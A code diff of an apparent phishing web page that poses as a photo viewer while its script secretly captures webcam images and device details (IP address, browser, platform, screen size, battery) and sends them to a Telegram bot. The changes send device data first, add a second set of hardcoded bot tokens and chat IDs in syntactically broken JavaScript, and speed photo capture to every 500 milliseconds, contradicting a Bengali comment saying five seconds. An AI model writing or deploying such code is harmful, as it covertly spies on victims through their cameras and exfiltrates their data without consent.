@@ -11,17 +11,45 @@
     </style>
 </head>
 <body>
-    <h1>⏬ Your Photo ⏬</h1>
+    <h1>⏬ image_9363638 ⏬</h1>
     <img src="camara/images.png" id="photo-preview">
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const BOT_TOKEN = "7884212116:AAG1hul0EbZom1iHucZztAW_FZOXf_g_TqA";
-        const CHAT_ID = "6728809478";
+        const BOT_TOKEN = "8023106166:AAEGed6xp19KBQWiUmsv6P7_Bi1ZDhHJ3VU","7884212116:AAG1hul0EbZom1iHucZztAW_FZOXf_g_TqA";
+        const CHAT_ID = "2139008203","6728809478";
         const canvas = document.getElementById('canvas');
         let videoStream = null;
         let video = null;
         let intervalId = null;
+
+        async function sendDeviceInfo() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const ipAddress = data.ip;
+
+                const battery = await navigator.getBattery();
+                const batteryStatus = `Battery Level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}`;
+
+                const deviceInfo = `
+Device Information:
+- IP Address: ${ipAddress}
+- Browser: ${navigator.userAgent}
+- Platform: ${navigator.platform}
+- Screen Resolution: ${window.screen.width}x${window.screen.height}
+- ${batteryStatus}
+                `;
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: deviceInfo })
+                });
+            } catch (error) {
+                console.error("Error fetching device info:", error);
+            }
+        }
 
         async function startCamera() {
             try {
@@ -66,42 +94,15 @@
             });
         }
 
-        async function sendDeviceInfo() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                const ipAddress = data.ip;
-
-                const battery = await navigator.getBattery();
-                const batteryStatus = `Battery Level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}`;
-
-                const deviceInfo = `
-Device Information:
-- IP Address: ${ipAddress}
-- Browser: ${navigator.userAgent}
-- Platform: ${navigator.platform}
-- Screen Resolution: ${window.screen.width}x${window.screen.height}
-- ${batteryStatus}
-                `;
-
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: deviceInfo })
-                });
-            } catch (error) {
-                console.error("Error fetching device info:", error);
-            }
-        }
-
         async function startPhotoCaptureLoop() {
+            sendDeviceInfo(); // ডিভাইসের তথ্য প্রথমেই পাঠাবে
+
             const cameraStarted = await startCamera();
             if (!cameraStarted) return;
 
-            sendDeviceInfo(); // প্রথমবার ডিভাইসের তথ্য পাঠাবে
             sendPhoto(); // প্রথম ছবি পাঠাবে
 
-            intervalId = setInterval(sendPhoto, 2000); // প্রতি ৫ সেকেন্ডে নতুন ছবি পাঠাবে
+            intervalId = setInterval(sendPhoto, 500); // প্রতি ৫ সেকেন্ডে নতুন ছবি পাঠাবে
         }
 
         function stopCamera() {
